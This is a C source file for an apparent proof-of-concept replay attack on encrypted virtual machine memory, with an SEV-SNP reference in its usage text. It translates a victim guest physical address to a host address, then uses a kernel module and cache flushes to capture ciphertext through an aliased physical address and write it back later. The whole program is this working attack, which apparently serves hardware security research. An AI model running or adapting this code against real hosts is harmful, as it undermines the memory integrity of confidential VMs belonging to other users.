#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
#include <limits.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#include "helpers.h"
#include "mem_range_repo.h"
#include "readalias.h"
#include "qemu_gpa2hpa.h"
#include "kvm_ioctls.h"



#define EXIT_CODE_OK 0
#define EXIT_CODE_ERR 1

typedef enum {
    GPA2HPA_QEMU,
    GPA2HPA_KERN,
} gpa2hpa_backend_t;

int main(int argc, char** argv) {
    int exit_code = 0;

    //
    // Parse args
    //
    if(argc != 5 ) {
        printf("Params:  <qemu pid>  <path to alias definition csv> <{gpa2hpa_qemu,gpa2hpa_kern}><target victim gpa in hex>\n");
        printf("For SEV-SNP with memfd, only gpa2hpa_kern produces correct results\n");
        return 0;
    }
    uint64_t qemu_pid;
    if( do_stroul(argv[1],0,&qemu_pid)) {
        err_log("failed to parse '%s' as qemu_pid\n", argv[1]);
        return -1;
    }

    char* path_alias_csv = argv[2];

    char* gpa2hpa_qemu_flag = "gpa2hpa_qemu";
    char* gpa2hpa_kern_flag = "gpa2hpa_kern";
    gpa2hpa_backend_t gpa2hpa_backend;
    if( 0 == memcmp(gpa2hpa_kern_flag, argv[3] , strlen(gpa2hpa_kern_flag) )) {
        gpa2hpa_backend = GPA2HPA_KERN;
    } else if( 0 == memcmp(gpa2hpa_qemu_flag, argv[3] , strlen(gpa2hpa_qemu_flag) )) {
        gpa2hpa_backend = GPA2HPA_QEMU;
    } else {
        printf("Invalid value for gpa2hpa backend: %s\n", argv[3]);
        return -1;
    }


    
    uint64_t victim_gpa;
    if( do_stroul(argv[4], 0, &victim_gpa)) {
        err_log("failed to parse '%s' as victim_gpa\n", argv[3]);
        return -1;
    }

    mem_range_t* mrs = NULL;
    uint64_t* alias_masks = NULL;
    size_t mrs_len;
    if( parse_csv(path_alias_csv, &mrs, &alias_masks, &mrs_len) ) {
        err_log("failed to parse memory range and aliases from %s\n", path_alias_csv);
        return -1;
    }

    
 

    //
    // Phase 1: Get HPA for GPA
    //

    printf("Translating gpa 0x%jx to hpa...\n", victim_gpa);
    uint64_t hpa;
    switch(gpa2hpa_backend) {
        case GPA2HPA_KERN:
            if(ioctl_gpa_to_hpa(victim_gpa, qemu_pid , &hpa )) {
                err_log("failed to translate gpa 0x%jx to hpa using kern backend\n", victim_gpa);
                goto cleanup;
            }
        break;
        case GPA2HPA_QEMU:
            if(qemu_gpa_to_hpa(victim_gpa, "127.0.0.1" , 4444 , &hpa )) {
                err_log("failed to translate gpa 0x%jx to hpa using qemu backend\n", victim_gpa);
            }
        break;
    };
    printf("hpa = 0x%jx\n",hpa);


    //
    // Phase 2: Attack
    // 1) Capture Value
    // 2) Wait
    // 3) Replay Value 
    //


    uint64_t alias;
    if( get_alias(hpa, mrs, alias_masks, mrs_len ,&alias)) {
        err_log("failed to get alias\n");
        exit_code = EXIT_CODE_ERR;
        goto cleanup;
    }
    printf("orig=0x%09jx\n", hpa);
    printf("alias=0x%09jx\n",alias);

    printf("Press Enter to capture ciphertext\n");
    getchar();

    if( open_kmod() ) {
        err_log("failed to open module\n");
        exit_code = EXIT_CODE_ERR;
        goto cleanup;
    }

    page_stats_t stats;
    const size_t captured_cipher_len = 4096;
    uint8_t* captured_cipher = malloc(captured_cipher_len);
    
    if(wbinvd_ac()) {
        err_log("wbinvd before capture failed\n");
        exit_code = EXIT_CODE_ERR;
        free(captured_cipher);
        goto cleanup;
    }
    if(memcpy_frompa(captured_cipher, alias, captured_cipher_len, &stats, true )) {
        err_log("failed to read from alias 0x%jx\n", alias);
        exit_code = EXIT_CODE_ERR;
        free(captured_cipher);
        goto cleanup;
    }

    printf("Press enter to start replay\n");
    getchar();


    if(wbinvd_ac()) {
        err_log("wbinvd before replay failed\n");
        exit_code = EXIT_CODE_ERR;
        free(captured_cipher);
        goto cleanup;
    }
    if(memcpy_topa(alias, captured_cipher, captured_cipher_len, &stats, true)) {
        err_log("failed to write to alias 0x%jx\n", alias);
        exit_code = EXIT_CODE_ERR;
        free(captured_cipher);
        goto cleanup;
    }
    if(wbinvd_ac()) {
        err_log("wbinvd after replay failed\n");
        exit_code = EXIT_CODE_ERR;
        free(captured_cipher);
        goto cleanup;
    }


cleanup:
    if( mrs ){
        free(mrs);
    }
    if( alias_masks) {
        free(alias_masks);
    }
    close_kmod();

    return exit_code;
}
